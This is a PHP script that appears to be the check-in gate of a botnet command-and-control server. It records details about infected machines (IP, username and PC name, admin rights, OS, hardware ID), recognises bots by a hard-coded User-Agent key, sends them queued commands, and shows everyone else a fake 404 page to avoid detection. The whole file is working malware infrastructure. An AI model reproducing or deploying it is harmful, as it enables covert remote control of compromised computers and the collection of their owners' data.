<?php

//recorded data is IP, Pure Epoch Time, Username@PC Name, Boolean of Administrator and Operating System
require_once('inc/config.php');
include('inc/functions.php');
include("ip_files/countries.php");


$ip = cleanstring($_SERVER['REMOTE_ADDR']);
$time = time();

$userandpc = cleanstring($_POST['userandpc']);
$admin = cleanstring($_POST['admin']);
$os = cleanstring($_POST['os']);
$ownerid = cleanstring($_POST['ownerid']);
$version = cleanstring($_POST['version']);
$hwid = cleanstring($_POST['hwid']);

$header = cleanstring($_SERVER['HTTP_USER_AGENT']);


$cc=iptocountry($ip);

		// Check if its a Bot and not a User
		if($header == "753cda8b05e32ef3b82e0ff947a4a936")
		{
			// Check if the bot exists
			if(isset($_POST['hwid']))
			{
				$bottest = mysql_query("SELECT * FROM clients WHERE hwid LIKE '$hwid'");
					while($row = mysql_fetch_array($bottest))
				 	{$id = $row['id'];}

				if(mysql_num_rows($bottest) == 1){
					$result = mysql_query("SELECT * FROM commands WHERE botid LIKE '$id' AND viewed = '0' LIMIT 1");
					mysql_query("UPDATE clients SET status='Online' WHERE id='$id'") ;
					mysql_query("UPDATE clients SET time='$time' WHERE id='$id'") ;
					mysql_query("UPDATE clients SET ip='$ip' WHERE id='$id'") ;

			  		// Detected a returning bot thus checking for commands
					while($row = mysql_fetch_array($result))
				 	{
						// Loop through the database to check for commands and display them preceding a '|'
						echo "".$row['cmd']."|".$row['variable']."";
						$cmdid = $row['id'];
						mysql_query("DELETE FROM commands WHERE id='$cmdid'");
						if($row['cmd'] == "UN"){
							mysql_query("DELETE FROM clients WHERE id='$id'");
						}
			 		}
			} else {
				// Detected a new bot thus adding its details to the DB
				mysql_query("INSERT INTO clients (id, ip, cc, time, userandpc, admin, os, status, hwid) VALUES ('', '$ip', '$cc','$time', '$userandpc', '$admin', '$os', 'Online', '$hwid')");
				$botcheck = mysql_query("SELECT id FROM clients WHERE ip LIKE '$ip' AND userandpc LIKE '$userandpc'");
				$botid = mysql_fetch_row($botcheck);
				echo '>id|'.$botid[0];
			}
			} else {
				// Detected a new bot thus adding its details to the DB
				mysql_query("INSERT INTO clients (id, ip, cc, time, userandpc, admin, os, status, hwid) VALUES ('', '$ip', '$cc','$time', '$userandpc', '$admin', '$os', 'Online', '$hwid')");
				$botcheck = mysql_query("SELECT id FROM clients WHERE ip LIKE '$ip' AND userandpc LIKE '$userandpc'");
				$botid = mysql_fetch_row($botcheck);
				echo '>>id|'.$botid[0];
			}
			//echo "Bot Recognised - $userandpc - $admin - $os";
		} else {
			
		// 404 it so no one detects the page
		header("HTTP/1.0 404 Not Found");
		
		echo '
		<html><head>
		<title>404 Not Found</title>
		</head><body>
		<h1>Not Found</h1>
		<p>The requested URL ';
		echo $_SERVER['PATH_TRANSLATED'];
		echo '/ was not found on this server.</p>
		<hr>
		<address>';
		echo $_SERVER['SERVER_SIGNATURE'];
		echo ' Server at ';
		echo $_SERVER['HTTP_HOST'];
		echo ' Port ';;
		echo $_SERVER['SERVER_PORT'];
		echo '</address>
		</body></html>
		';
		}

?>